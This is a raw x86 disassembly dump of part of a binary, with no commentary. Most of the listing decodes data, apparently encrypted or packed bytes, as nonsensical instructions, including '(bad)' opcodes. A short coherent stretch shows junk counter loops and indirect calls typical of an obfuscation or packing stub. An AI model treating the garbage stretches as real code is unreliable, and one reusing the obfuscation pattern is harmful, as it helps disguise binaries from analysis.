  40a81a:	xor    dl,al
  40a81c:	cdq    
  40a81d:	in     eax,dx
  40a81e:	jg     0x40a835
  40a820:	aas    
  40a821:	push   edi
  40a822:	push   edx
  40a823:	sahf   
  40a824:	imul   edi,edx,0x9209142a
  40a82a:	popf   
  40a82b:	jg     0x40a878
  40a82d:	data16 cmp dh,cl
  40a830:	outs   dx,DWORD PTR ds:[esi]
  40a831:	mov    ebx,0xe5846e49
  40a836:	cld    
  40a837:	out    dx,al
  40a838:	out    dx,eax
  40a839:	sub    al,0x0
  40a83c:	mov    ebp,esp
  40a83e:	ja     0x40a8a2
  40a840:	xchg   ecx,eax
  40a841:	sub    DWORD PTR [ebp-0x54],0xfef5d87c
  40a848:	jp     0x40a8a2
  40a84a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a84b:	gs sub bh,0xf1
  40a84f:	iret   
  40a850:	aam    0x49
  40a852:	xor    eax,0xa7127b11
  40a857:	in     eax,0xfd
  40a859:	leave  
  40a85a:	adc    BYTE PTR [esi+ebp*2-0x426d925f],ah
  40a861:	pop    es
  40a862:	es jns 0x40a83e
  40a865:	adc    al,0xd8
  40a867:	mov    eax,0xbe47be50
  40a86c:	xor    edx,DWORD PTR [eax]
  40a86e:	scas   al,BYTE PTR es:[edi]
  40a86f:	inc    ecx
  40a870:	outs   dx,BYTE PTR ds:[esi]
  40a871:	js     0x40a877
  40a873:	cmp    eax,0x8dd59f7a
  40a878:	push   edi
  40a879:	ficom  DWORD PTR [edi-0x4c]
  40a87c:	cdq    
  40a87d:	outs   dx,BYTE PTR ds:[esi]
  40a87e:	ret    
  40a87f:	push   ss
  40a880:	fbld   TBYTE PTR [eax-0x2ea19f2c]
  40a886:	xor    DWORD PTR [edx+0x4939cda8],edi
  40a88c:	imul   BYTE PTR [ecx]
  40a88e:	imul   edx,DWORD PTR ds:0xefa5b50b,0xd17a55d2
  40a898:	dec    esp
  40a899:	ret    0xabf8
  40a89c:	jae    0x40a8cc
  40a89e:	aas    
  40a89f:	sub    bh,BYTE PTR [edi]
  40a8a1:	fwait
  40a8a2:	jl     0x40a902
  40a8a4:	pop    eax
  40a8a5:	sub    al,0xb5
  40a8a7:	pop    ss
  40a8a8:	lds    edx,FWORD PTR [ecx+edx*8+0x1e4704e4]
  40a8af:	push   ss
  40a8b0:	stos   DWORD PTR es:[edi],eax
  40a8b1:	or     dl,BYTE PTR [eax+0x6a]
  40a8b4:	xor    DWORD PTR [ecx+ebp*1-0x18e654a5],ebx
  40a8bb:	mov    ebx,0x96280255
  40a8c0:	mov    BYTE PTR [edx+0x45],bl
  40a8c3:	pop    ss
  40a8c4:	pusha  
  40a8c5:	dec    esi
  40a8c6:	retf   0xbdda
  40a8c9:	sub    cl,BYTE PTR [edi+0x537d134c]
  40a8cf:	fidivr WORD PTR [edx+0x6ed356dc]
  40a8d5:	enter  0x470,0x97
  40a8d9:	retf   0x82b1
  40a8dc:	sub    al,0xf
  40a8de:	sahf   
  40a8df:	pushf  
  40a8e0:	ret    0x41f1
  40a8e3:	xchg   edx,eax
  40a8e4:	inc    ecx
  40a8e5:	push   0xed69fb18
  40a8ea:	mov    eax,ds:0xd2a4abb4
  40a8ef:	retf   
  40a8f0:	loope  0x40a901
  40a8f2:	popf   
  40a8f3:	adc    DWORD PTR [ebx+0x2180011f],0xea66a28c
  40a8fd:	lahf   
  40a8fe:	and    eax,0x6a2ffc98
  40a903:	sbb    BYTE PTR [ebp-0x4d],dl
  40a906:	push   esp
  40a907:	test   al,0xd0
  40a909:	push   ds
  40a90a:	out    dx,eax
  40a90b:	mov    al,ds:0x33645e
  40a910:	mov    eax,0xb7acf904
  40a915:	push   eax
  40a916:	nop
  40a917:	mov    ?,edx
  40a919:	add    edi,0xffffffbd
  40a91c:	mov    eax,ds:0xa820e7f6
  40a921:	xlat   BYTE PTR ds:[ebx]
  40a922:	mov    esp,0x9ae9648e
  40a927:	stos   BYTE PTR es:[edi],al
  40a928:	not    DWORD PTR [eax]
  40a92a:	clc    
  40a92b:	jne    0x40a95b
  40a92d:	xlat   BYTE PTR ds:[ebx]
  40a92e:	or     al,0xb2
  40a930:	or     BYTE PTR [ecx+0x33cd3059],0xe4
  40a937:	jnp    0x40a990
  40a939:	imul   edx,DWORD PTR [esi],0x57
  40a93c:	or     ebp,ebp
  40a93e:	inc    esp
  40a93f:	pop    ebp
  40a940:	inc    esi
  40a941:	pushf  
  40a942:	pop    ebx
  40a943:	cli    
  40a944:	dec    esi
  40a945:	add    BYTE PTR [ecx],0x1
  40a948:	(bad)  
  40a949:	ds pop ebp
  40a94b:	(bad)  
  40a94c:	dec    BYTE PTR [eax+0x5b3b3dcd]
  40a952:	cmp    al,ah
  40a954:	jne    0x40a950
  40a956:	xor    BYTE PTR [edi+0x35],al
  40a959:	jmp    0x40a971
  40a95b:	xchg   ebx,eax
  40a95c:	es inc ebx
  40a95e:	add    esi,ecx
  40a960:	(bad)  
  40a961:	cld    
  40a962:	xlat   BYTE PTR ds:[ebx]
  40a963:	xor    dh,BYTE PTR [eax-0x5bc9d8e9]
  40a969:	sbb    al,BYTE PTR [eax*1-0x4f6b5453]
  40a970:	jmp    0xcddd:0xc61a949d
  40a977:	ficom  DWORD PTR [edx+0x57]
  40a97a:	out    0xd2,eax
  40a97c:	push   edi
  40a97d:	mov    cl,0x29
  40a97f:	les    esp,FWORD PTR [ecx-0x73]
  40a982:	loop   0x40a92f
  40a984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a985:	(bad)  
  40a986:	out    dx,al
  40a987:	mov    dh,0xef
  40a989:	and    al,BYTE PTR [ebx+0x15]
  40a98c:	test   esi,edi
  40a98e:	push   edi
  40a98f:	mov    ah,0xad
  40a991:	adc    al,0x4
  40a993:	sbb    DWORD PTR [esi],ecx
  40a995:	addr16 push es
  40a997:	pushf  
  40a998:	cmp    bh,BYTE PTR [eax]
  40a99a:	loope  0x40a930
  40a99c:	loope  0x40a95c
  40a99e:	fld    st(7)
  40a9a0:	jnp    0x40a972
  40a9a2:	pop    esi
  40a9a3:	mov    cl,0x3b
  40a9a5:	hlt    
  40a9a6:	xor    dh,BYTE PTR [ebx+0x7fac5f6c]
  40a9ac:	mov    ah,dh
  40a9ae:	inc    edi
  40a9af:	fst    DWORD PTR [esi]
  40a9b1:	test   al,0x7e
  40a9b3:	sbb    DWORD PTR [edi-0x3050cb09],0x4a1d0c4a
  40a9bd:	push   ss
  40a9be:	fst    DWORD PTR [eax+0x27b20d19]
  40a9c4:	jg     0x40a9b9
  40a9c6:	dec    ecx
  40a9c7:	xor    eax,0x334cf886
  40a9cc:	ret    
  40a9cd:	push   esi
  40a9ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9cf:	pop    ebp
  40a9d0:	cwde   
  40a9d1:	or     al,0xa6
  40a9d3:	test   al,bl
  40a9d5:	nop
  40a9d6:	out    0xd6,eax
  40a9d8:	pop    es
  40a9d9:	mov    WORD PTR [ebx+0x199fb98c],ds
  40a9df:	add    cl,BYTE PTR [eax-0x79b3ac7f]
  40a9e5:	jno    0x40a98a
  40a9e7:	test   DWORD PTR [ebp+0x7c],0x6bc62eb0
  40a9ee:	adc    al,BYTE PTR [edx+0x2deeb88e]
  40a9f4:	lds    ebp,FWORD PTR [ecx]
  40a9f6:	arpl   WORD PTR [ebx+0x1c],cx
  40a9f9:	xchg   ebp,eax
  40a9fa:	pusha  
  40a9fb:	xchg   edi,eax
  40a9fc:	(bad)  
  40a9fd:	sbb    dh,al
  40a9ff:	sub    ebp,esp
  40aa01:	repz pop ds
  40aa03:	add    al,0xce
  40aa05:	pop    esi
  40aa06:	mov    bl,0xf
  40aa08:	xchg   esi,eax
  40aa09:	cmp    eax,0x922274df
  40aa0e:	adc    bl,al
  40aa10:	jne    0x40aa46
  40aa12:	outs   dx,BYTE PTR ds:[esi]
  40aa13:	push   ss
  40aa14:	outs   dx,DWORD PTR ds:[esi]
  40aa15:	sub    al,0xa2
  40aa17:	cli    
  40aa18:	mov    dh,0x1b
  40aa1a:	dec    edx
  40aa1b:	nop
  40aa1c:	idiv   bh
  40aa1e:	in     al,0x22
  40aa20:	jle    0x40a9b5
  40aa22:	push   ebx
  40aa23:	sub    BYTE PTR [edx+0x54],ch
  40aa26:	cmp    DWORD PTR [ebp-0x2060b4fe],0x7bebcb2b
  40aa30:	je     0x40a9cf
  40aa32:	(bad)
  40aa35:	loope  0x40a9ce
  40aa37:	mov    bh,0x32
  40aa39:	outs   dx,BYTE PTR ds:[esi]
  40aa3a:	or     BYTE PTR [ebx-0x548b69b2],dl
  40aa40:	cmp    eax,0x56c9de14
  40aa45:	and    BYTE PTR [ebx-0x69],ch
  40aa48:	ficomp WORD PTR [ebx+0x77]
  40aa4b:	jle    0x40a9ff
  40aa4d:	push   esi
  40aa4e:	in     al,dx
  40aa4f:	sar    dh,cl
  40aa51:	fimul  WORD PTR [eax+eax*2-0x2c626fb8]
  40aa58:	mov    dh,0xd3
  40aa5a:	lds    ebp,FWORD PTR [edx]
  40aa5c:	mov    WORD PTR [edx+0x2c],fs
  40aa5f:	sub    eax,0x1989aa
  40aa64:	lock retf 0xba57
  40aa68:	jmp    DWORD PTR [ebx]
  40aa6a:	(bad)  
  40aa6b:	lea    esi,[eax+0x3d]
  40aa6e:	fadd   st,st(4)
  40aa70:	adc    ebp,ebx
  40aa72:	mov    al,ds:0xb831908a
  40aa77:	(bad)  
  40aa78:	sti    
  40aa79:	in     al,0xed
  40aa7b:	out    dx,eax
  40aa7c:	sub    ch,BYTE PTR [eax+0x253fa8c2]
  40aa82:	cmp    DWORD PTR [edi],edi
  40aa84:	inc    esi
  40aa85:	inc    BYTE PTR [eax+0x71548e6e]
  40aa8b:	shl    ah,1
  40aa8d:	fnstenv ds:0x53538419
  40aa93:	shl    BYTE PTR [ebx],cl
  40aa95:	and    al,0x9b
  40aa97:	mov    al,0xdd
  40aa99:	xchg   ebp,eax
  40aa9a:	(bad)  
  40aa9b:	sub    eax,0x9b23dfaa
  40aaa0:	imul   esp,eax,0xffffffa2
  40aaa3:	pop    es
  40aaa4:	mov    ebp,0xc9991834
  40aaa9:	fisttp DWORD PTR [esi+0x4e918af3]
  40aaaf:	pop    edi
  40aab0:	mov    edi,0x7e7142b8
  40aab5:	jle    0x40aa6c
  40aab7:	jns    0x40aa74
  40aab9:	or     ebx,esp
  40aabb:	nop
  40aabc:	popf   
  40aabd:	out    0x46,eax
  40aabf:	and    DWORD PTR [edx+0xb],edi
  40aac2:	xchg   ecx,eax
  40aac3:	dec    edx
  40aac4:	stc    
  40aac5:	jle    0x40aa77
  40aac7:	or     al,0xb7
  40aac9:	xor    al,0xea
  40aacb:	repnz mov ds:0x903394a5,al
  40aad1:	mov    WORD PTR [esi+ecx*8+0x50abf56b],gs
  40aad8:	popa   
  40aad9:	sub    DWORD PTR ds:0x94f03a27,edx
  40aadf:	xchg   ebp,eax
  40aae0:	fist   WORD PTR [eax]
  40aae2:	xor    al,0x85
  40aae4:	xlat   BYTE PTR ds:[ebx]
  40aae5:	cld    
  40aae6:	repnz in eax,dx
  40aae8:	mov    eax,0x62160ba2
  40aaed:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40aaef:	adc    ebx,DWORD PTR [eax+0x63]
  40aaf2:	mul    DWORD PTR [ebx+0xfb0d3e0]
  40aaf8:	inc    ecx
  40aaf9:	fbstp  TBYTE PTR [ebx+0x67]
  40aafc:	call   0x9a8c:0xb1b277b
  40ab03:	mov    bl,0x1b
  40ab05:	sti    
  40ab06:	je     0x40ab50
  40ab08:	stc    
  40ab09:	sbb    cl,al
  40ab0b:	mov    ch,0xe5
  40ab0d:	cdq    
  40ab0e:	fbld   TBYTE PTR [ebx-0x78]
  40ab11:	aas    
  40ab12:	es mov bh,0x16
  40ab15:	clc    
  40ab16:	fisttp WORD PTR [eax-0x22816a16]
  40ab1c:	mov    ebp,0xa2cde361
  40ab21:	clc    
  40ab22:	dec    ecx
  40ab23:	push   ebp
  40ab24:	(bad)  
  40ab25:	or     DWORD PTR [edi-0x2a],ebx
  40ab28:	mov    ds:0x9a92b3bc,eax
  40ab2d:	out    dx,eax
  40ab2e:	push   0xffffffcc
  40ab30:	sub    DWORD PTR [ebx],edx
  40ab32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab33:	mov    al,ds:0xcaeee8f0
  40ab38:	jnp    0x40ab8c
  40ab3a:	mov    bh,0x7e
  40ab3c:	xchg   ecx,eax
  40ab3d:	mov    eax,0xad230bba
  40ab42:	inc    edx
  40ab44:	mov    bh,BYTE PTR [ebx+0x2a]
  40ab47:	idiv   bh
  40ab49:	jmp    0xb882:0x81283d26
  40ab50:	xchg   edi,eax
  40ab51:	inc    ebp
  40ab52:	inc    eax
  40ab53:	sbb    DWORD PTR [edi-0x1cc973fd],ebx
  40ab59:	xchg   BYTE PTR [ecx+0x1c6cc36],ch
  40ab5f:	xchg   esi,eax
  40ab60:	xor    BYTE PTR [edi-0x7c2d86cd],dh
  40ab66:	pop    edx
  40ab67:	stos   DWORD PTR es:[edi],eax
  40ab68:	jne    0x40ab90
  40ab6a:	rcr    BYTE PTR [ebp+0x6e],0x64
  40ab6e:	int3   
  40ab6f:	cmp    eax,0xfd37a25
  40ab74:	lock fwait
  40ab76:	jmp    0x40ab15
  40ab78:	dec    esp
  40ab79:	in     eax,dx
  40ab7a:	sub    eax,0x886d4408
  40ab7f:	or     BYTE PTR [edx+0x4a],dh
  40ab82:	jbe    0x40ab97
  40ab84:	jo     0x40ab2d
  40ab86:	push   es
  40ab87:	call   DWORD PTR ds:0xb769dbdc
  40ab8d:	lahf   
  40ab8e:	not    DWORD PTR [ebx+ecx*2-0x6619d2cb]
  40ab95:	adc    BYTE PTR [edx+0x5f],0x65
  40ab99:	stos   DWORD PTR es:[edi],eax
  40ab9a:	test   BYTE PTR [esi+0x22963c8c],ah
  40aba0:	mov    al,0xcf
  40aba2:	or     al,0x62
  40aba4:	imul   ecx,DWORD PTR [ecx+0x5b3a9591],0x24
  40abab:	fs cmp dl,cl
  40abae:	inc    eax
  40abaf:	push   0x3e
  40abb1:	in     eax,0x3f
  40abb3:	sbb    dl,BYTE PTR [ebx-0x6c23d5b5]
  40abb9:	xchg   esp,eax
  40abba:	ds dec ebp
  40abbc:	outs   dx,BYTE PTR ds:[esi]
  40abbd:	call   0xe0dcb103
  40abc2:	push   esi
  40abc3:	push   edi
  40abc4:	ret    0xd383
  40abc7:	pushf  
  40abc8:	leave  
  40abc9:	sub    eax,0xa13deebd
  40abce:	sbb    al,0xd0
  40abd0:	imul   eax,DWORD PTR [ecx],0xffffffab
  40abd3:	and    eax,0x6fd48a41
  40abd8:	adc    DWORD PTR [ecx+0x4c],ecx
  40abdb:	jmp    0x6f4e4b
  40abe0:	dec    ecx
  40abe1:	inc    edi
  40abe2:	pop    ecx
  40abe3:	iret   
  40abe4:	test   DWORD PTR [esp+ecx*4+0x30bdd4e5],eax
  40abeb:	pop    cx
  40abed:	or     eax,0x60d91b18
  40abf2:	mov    cl,0xf9
  40abf4:	gs js  0x40ac42
  40abf7:	(bad)  [ecx]
  40abf9:	gs mov ebp,0x13fbe189
  40abff:	push   ecx
  40ac00:	dec    ebx
  40ac01:	aam    0xf
  40ac03:	dec    DWORD PTR [edi-0x27fa3283]
  40ac09:	hlt    
  40ac0a:	inc    ecx
  40ac0b:	xchg   ebx,eax
  40ac0c:	pop    edx
  40ac0d:	jae    0x40ac62
  40ac0f:	mov    ch,BYTE PTR [esi-0x6285f3a5]
  40ac15:	call   0x8df8d90a
  40ac1a:	mov    WORD PTR [edi+0x16ae5404],ss
  40ac20:	dec    esp
  40ac21:	sahf   
  40ac22:	pop    ds
  40ac23:	jmp    0x40ac7c
  40ac25:	sub    esp,DWORD PTR [ecx-0x7c5367dc]
  40ac2b:	lods   eax,DWORD PTR ds:[esi]
  40ac2c:	mov    dh,BYTE PTR [ebx-0x4d]
  40ac2f:	jge    0x40abe9
  40ac31:	mov    BYTE PTR [ebx],dl
  40ac33:	cwde   
  40ac34:	mov    esp,0x384e1ffd
  40ac39:	push   esp
  40ac3a:	dec    ecx
  40ac3b:	push   ebp
  40ac3c:	dec    ebx
  40ac3d:	test   al,0x53
  40ac3f:	push   ds
  40ac40:	(bad)  
  40ac41:	mul    BYTE PTR ds:0x8e021ae2
  40ac47:	mov    ecx,0x3d03d3a1
  40ac4c:	mov    BYTE PTR [edx-0x7b],bh
  40ac4f:	adc    al,0x35
  40ac51:	out    0xca,eax
  40ac53:	aaa    
  40ac54:	or     eax,0xdad75388
  40ac59:	xchg   edi,eax
  40ac5a:	push   es
  40ac5b:	pop    ds
  40ac5c:	in     al,dx
  40ac5d:	mov    eax,0xdc0ffc3d
  40ac62:	adc    eax,0x999a48f
  40ac67:	(bad)  
  40ac68:	loop   0x40ac11
  40ac6a:	adc    BYTE PTR [ebx],cl
  40ac6c:	shl    BYTE PTR [ecx+0x6b],0x87
  40ac70:	mov    ds:0xbd3cad3c,al
  40ac75:	mov    ebx,0x886d022c
  40ac7a:	jl     0x40ac09
  40ac7c:	push   ebx
  40ac7d:	pop    ebp
  40ac7e:	dec    ebp
  40ac7f:	cwde   
  40ac80:	push   eax
  40ac81:	jne    0x40ac1d
  40ac83:	js     0x40ac1d
  40ac85:	or     al,0x5b
  40ac87:	adc    eax,0x202410f7
  40ac8c:	popa   
  40ac8d:	inc    ebp
  40ac8e:	mov    es,WORD PTR [ecx+edx*1]
  40ac91:	hlt    
  40ac92:	cmc    
  40ac93:	lods   al,BYTE PTR ds:[esi]
  40ac94:	jns    0x40ace7
  40ac96:	cdq    
  40ac97:	mov    dl,0x89
  40ac99:	jb     0x40ac57
  40ac9b:	fmul   QWORD PTR [edi-0x58]
  40ac9e:	mov    dh,0x11
  40aca0:	fcmove st,st(1)
  40aca2:	mov    esi,0xa28cf84f
  40aca7:	mov    edx,cs
  40aca9:	xchg   esi,eax
  40acaa:	or     BYTE PTR [edx],dl
  40acac:	das    
  40acad:	push   0x391c9b9f
  40acb2:	ror    BYTE PTR [eax+0x7fd0fbd2],0xe2
  40acb9:	xor    eax,0xfe6398b0
  40acbe:	push   eax
  40acbf:	ror    DWORD PTR [ebp+0x32],0x5b
  40acc3:	pop    ecx
  40acc4:	add    DWORD PTR [esi],eax
  40acc6:	sar    BYTE PTR [ebx+ebx*4-0x122799ae],0xc5
  40acce:	aas    
  40accf:	imul   ch
  40acd1:	and    al,0xd3
  40acd3:	push   0x800fb90f
  40acd8:	add    DWORD PTR [ebp-0x14],0xf
  40acdc:	jecxz  0x40ad59
  40acde:	mov    dl,BYTE PTR [edi+0x34]
  40ace1:	(bad)
  40ace5:	jns    0x40ac81
  40ace7:	call   0x93b3:0xf61635cd
  40acee:	int3   
  40acef:	call   0xfbf3:0xa6e92895
  40acf6:	sub    DWORD PTR [esi+0x2bd369ba],edi
  40acfc:	dec    ebx
  40acfd:	inc    ecx
  40acfe:	ins    BYTE PTR es:[edi],dx
  40acff:	mov    al,ds:0x35d1f122
  40ad04:	aaa    
  40ad05:	push   ecx
  40ad06:	test   BYTE PTR ds:0xf936e63,al
  40ad0c:	cmp    BYTE PTR [ebx-0x5b99f275],al
  40ad12:	fwait
  40ad13:	jmp    0x97724662
  40ad18:	mov    DWORD PTR [ebx-0x68],edx
  40ad1b:	pop    esi
  40ad1c:	(bad)  
  40ad1d:	sub    edi,eax
  40ad1f:	mov    cl,0xa7
  40ad21:	and    edi,DWORD PTR [ebx+0xcdc2461]
  40ad27:	jmp    0x40acff
  40ad29:	pop    esi
  40ad2a:	jmp    0xf833044
  40ad2f:	(bad)  
  40ad30:	ins    BYTE PTR es:[edi],dx
  40ad31:	outs   dx,BYTE PTR ds:[esi]
  40ad32:	rcr    DWORD PTR [edx],1
  40ad34:	repz push ecx
  40ad36:	jmp    0xcefd9154
  40ad3b:	aam    0xf6
  40ad3d:	test   DWORD PTR [ecx+0xb],eax
  40ad40:	xchg   edi,eax
  40ad41:	imul   edx,DWORD PTR [eax+0x62],0xb4b7b2be
  40ad48:	dec    edi
  40ad49:	ret    
  40ad4a:	mov    WORD PTR [eax-0x6f],fs
  40ad4d:	pop    es
  40ad4e:	inc    esi
  40ad4f:	mov    ebp,0xe9432c82
  40ad54:	push   ebx
  40ad55:	adc    edi,DWORD PTR [ebp-0x76]
  40ad58:	sbb    ebp,esp
  40ad5a:	cli    
  40ad5b:	xor    dl,BYTE PTR [eax-0x60908b7e]
  40ad61:	dec    esp
  40ad62:	inc    esp
  40ad63:	add    edi,DWORD PTR [ecx+0x41]
  40ad66:	shl    dl,cl
  40ad68:	cli    
  40ad69:	xor    dl,bl
  40ad6b:	repnz mov al,0x5e
  40ad6e:	mov    al,0x53
  40ad70:	retf   0x93e7
  40ad73:	push   esi
  40ad74:	cmp    edx,ebp
  40ad76:	jle    0x40ad28
  40ad78:	jb     0x40ada2
  40ad7a:	jae    0x40ad49
  40ad7c:	popa   
  40ad7d:	in     al,0x20
  40ad7f:	pop    esp
  40ad80:	clc    
  40ad81:	sub    al,0x93
  40ad83:	xor    ch,cl
  40ad85:	add    al,0xd8
  40ad87:	jo     0x40adbc
  40ad89:	ret    
  40ad8a:	dec    eax
  40ad8b:	inc    eax
  40ad8c:	inc    ebx
  40ad8d:	mov    al,ds:0x242f479d
  40ad92:	ficomp DWORD PTR [ebp+0x2c572a89]
  40ad98:	mul    DWORD PTR [esi+0xfec458b]
  40ad9e:	mov    bh,0xd
  40ada0:	pop    edi
  40ada1:	xchg   ecx,eax
  40ada2:	inc    edx
  40ada3:	add    BYTE PTR [ecx],cl
  40ada5:	or     eax,0x4291e7
  40adaa:	mov    ecx,DWORD PTR [ebp+0x8]
  40adad:	add    ecx,DWORD PTR [eax+0x1c]
  40adb0:	mov    DWORD PTR [ebp-0x14],ecx
  40adb3:	mov    DWORD PTR ds:0x4291d3,0x1651
  40adbd:	jmp    0x40d2ae
  40adc2:	mov    eax,DWORD PTR [ebp-0x2c]
  40adc5:	and    DWORD PTR ds:0x4291c3,0x0
  40adcf:	jmp    0x40ade1
  40add4:	mov    ecx,DWORD PTR ds:0x4291c3
  40adda:	inc    ecx
  40addb:	mov    DWORD PTR ds:0x4291c3,ecx
  40ade1:	cmp    DWORD PTR ds:0x4291c3,0x1e
  40ade8:	jae    0x40ae37
  40adee:	cmp    DWORD PTR ds:0x4291c3,0x10
  40adf5:	jbe    0x40ae37
  40adfb:	jmp    0x40ae18
  40ae00:	push   0x54af
  40ae05:	push   0x428000
  40ae0a:	push   0x42810e
  40ae0f:	push   DWORD PTR [ebp-0x10]
  40ae12:	call   DWORD PTR ds:0x42a79b
  40ae18:	cmp    DWORD PTR ds:0x4291c3,0xf
  40ae1f:	jne    0x40ae32
  40ae25:	mov    ecx,DWORD PTR ds:0x4291c3
  40ae2b:	inc    ecx
  40ae2c:	mov    DWORD PTR ds:0x4291c3,ecx
  40ae32:	jmp    0x40add4
  40ae37:	mov    ecx,DWORD PTR [ebp+0x8]
  40ae3a:	add    ecx,DWORD PTR [eax+ebx*4]
  40ae3d:	and    DWORD PTR ds:0x4291df,0x0
  40ae47:	jmp    0x40ae57
  40ae4c:	mov    eax,ds:0x4291df
  40ae51:	inc    eax
  40ae52:	mov    ds:0x4291df,eax
  40ae57:	cmp    DWORD PTR ds:0x4291df,0x10
  40ae5e:	jae    0x40aea1
  40ae64:	cmp    DWORD PTR ds:0x4291df,0x5
  40ae6b:	jb     0x40aea1
  40ae71:	jmp    0x40ae84
  40ae76:	push   0x73ed
  40ae7b:	push   DWORD PTR [ebp-0xc]
  40ae7e:	call   DWORD PTR ds:0x42a79f
  40ae84:	cmp    DWORD PTR ds:0x4291df,0x4
  40ae8b:	jne    0x40ae9c
  40ae91:	mov    eax,ds:0x4291df
  40ae96:	inc    eax
  40ae97:	mov    ds:0x4291df,eax
  40ae9c:	jmp    0x40ae4c
  40aea1:	mov    DWORD PTR [ebp-0x28],ecx
  40aea4:	add    ecx,DWORD PTR ds:0x429183
  40aeaa:	mov    eax,DWORD PTR [ebp-0x4]
  40aead:	xor    DWORD PTR ds:0x42916b,ebx
  40aeb3:	mov    ecx,DWORD PTR [ebp-0x28]
  40aeb6:	xor    eax,esi
  40aeb8:	jmp    0x40d26c
  40aebd:	add    BYTE PTR [ecx],dh
  40aebf:	cld    
  40aec0:	sbb    esp,ecx
  40aec2:	nop
  40aec3:	and    BYTE PTR [eax],0xe5
  40aec6:	push   eax
  40aec7:	(bad)  [edi+0x3f675ac7]
  40aecd:	sub    al,0xf1
  40aecf:	add    DWORD PTR [ebx-0x7c7ca318],0x22
  40aed6:	fcomp  QWORD PTR [eax+ecx*2-0x42ffc07]
  40aedd:	pusha  
  40aede:	inc    esp
  40aedf:	jmp    DWORD PTR [eax+0x6e9f77a8]
  40aee5:	cld    
  40aee6:	push   esp
  40aee7:	mov    al,0x13
  40aee9:	mov    esp,0x20b55cd7
  40aeee:	fdiv   QWORD PTR [eax-0x720f4c8e]
  40aef4:	sahf   
  40aef5:	jge    0x40af32
  40aef7:	rcl    BYTE PTR [edx+0x761dcb87],0x33
  40aefe:	add    ah,BYTE PTR [eax+0x6a0986af]
  40af04:	xlat   BYTE PTR ds:[ebx]
  40af05:	fld    DWORD PTR [eax+ecx*1+0x34]
  40af09:	dec    esp
  40af0a:	jns    0x40ae9b
  40af0c:	loop   0x40af71
  40af0e:	pop    ss
  40af0f:	and    edi,esp
  40af11:	cmp    DWORD PTR [edx-0x8],esi
  40af14:	mov    edi,DWORD PTR [ecx+0x3a]
  40af17:	rcl    DWORD PTR [esi+edi*4+0xfd73aed],cl
  40af1e:	adc    al,0xee
  40af20:	pop    edx
  40af21:	test   BYTE PTR [esi+0x3e66c033],dh
  40af27:	add    DWORD PTR [ebp+0x3badb91b],0xdc808e85
  40af31:	cld    
  40af32:	pop    ss
  40af33:	(bad)
  40af37:	cmc    
  40af38:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40af3a:	(bad)  
  40af3b:	sub    edx,DWORD PTR [edx-0x4fd53db5]
  40af41:	(bad)  
  40af42:	aas    
  40af43:	jmp    0xdcb0:0x202d6175
  40af4a:	das    
  40af4b:	mov    al,0x53
  40af4d:	mov    bl,0x88
  40af4f:	out    dx,eax
  40af50:	stc    
  40af51:	mov    ds:0x2b2da8e8,al
  40af56:	mov    dl,0xef
  40af58:	add    ebp,DWORD PTR [eax+0x1dcd4460]
  40af5e:	fistp  QWORD PTR [eax-0x373092aa]
  40af64:	jbe    0x40af4f
  40af66:	sbb    BYTE PTR [ecx-0x56043ada],dl
  40af6c:	mov    ah,0x72
  40af6e:	sbb    DWORD PTR [ecx+0x71d07bbc],ebp
  40af74:	mov    DWORD PTR [edi-0x556f9e56],ebp
  40af7a:	(bad)  
  40af7b:	dec    ebp
  40af7c:	aaa    
  40af7d:	sti    
  40af7e:	push   cs
  40af7f:	je     0x40af81
  40af81:	mov    BYTE PTR [esi-0x4f],dh
  40af84:	ror    ebp,cl
  40af86:	es out dx,eax
  40af88:	jns    0x40afa4
  40af8a:	inc    ebx
  40af8b:	add    al,0xf5
  40af8d:	ret    
  40af8e:	imul   DWORD PTR [ebx-0x26a5a92c]
  40af94:	pop    esi
  40af95:	add    BYTE PTR [edx+edx*4-0x1a],ch
  40af99:	xchg   edi,eax
  40af9a:	pop    es
  40af9b:	add    bl,BYTE PTR [ebx+ebx*8-0x19]
  40af9f:	mov    edi,0xda10cae5
  40afa5:	inc    esp
  40afa6:	sbb    eax,0x4b0ce2d2
  40afab:	push   ebx
  40afac:	nop
  40afad:	(bad)  
  40afae:	arpl   WORD PTR [ebp+0x79aa090c],ax
  40afb4:	push   cs
  40afb5:	test   eax,0xc7d943c4
  40afba:	adc    BYTE PTR [ecx],al
  40afbc:	test   bl,ch
  40afbe:	sbb    DWORD PTR [ecx],eax
  40afc0:	aam    0x4b
  40afc2:	add    cl,ah
  40afc4:	adc    ebx,DWORD PTR [esi]
  40afc6:	jo     0x40afc9
  40afc8:	fcomp  DWORD PTR [edi+0x304900d8]
  40afce:	mov    bh,0xff
  40afd0:	sbb    DWORD PTR [esi-0x41382941],ebp
  40afd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afd7:	xor    eax,0xfb55605f
  40afdc:	add    DWORD PTR ds:0x7288741,edx
  40afe2:	and    DWORD PTR ss:0x49f9a027,eax
  40afe9:	and    DWORD PTR [edi],edi
  40afeb:	fisubr WORD PTR [esp+eax*1]
  40afee:	inc    ebp
  40afef:	(bad)  
  40aff0:	dec    ebx
  40aff1:	fstp   DWORD PTR ss:[esi+0x79c3d5d5]
  40aff8:	fstp   DWORD PTR ds:0xdf1acbcc
  40affe:	or     eax,0xdc657570
  40b003:	cmp    esi,DWORD PTR [edi]
  40b005:	mov    dl,0xf5
  40b007:	push   esi
  40b008:	dec    ebx
  40b009:	and    DWORD PTR [ebp+0x2b],0xdfe32e30
  40b010:	dec    edi
  40b011:	aam    0x6f
  40b013:	sahf   
  40b014:	adc    al,0xd1
  40b016:	retf   0x842d
  40b019:	or     DWORD PTR [ecx+0x1d5d0923],ebx
  40b01f:	jnp    0x40afa9
  40b021:	cld    
  40b022:	fwait
  40b023:	push   ecx
  40b024:	scas   eax,DWORD PTR es:[edi]
  40b025:	(bad)  
  40b026:	iret   
  40b027:	ss stos BYTE PTR es:[edi],al
  40b029:	mov    esp,0x2ec26af4
  40b02e:	pop    edx
  40b02f:	nop
  40b030:	retf   0xf419
  40b033:	lods   eax,DWORD PTR ds:[esi]
  40b034:	out    0x14,al
  40b036:	pop    ecx
  40b037:	into   
  40b038:	mov    ds,WORD PTR [edx]
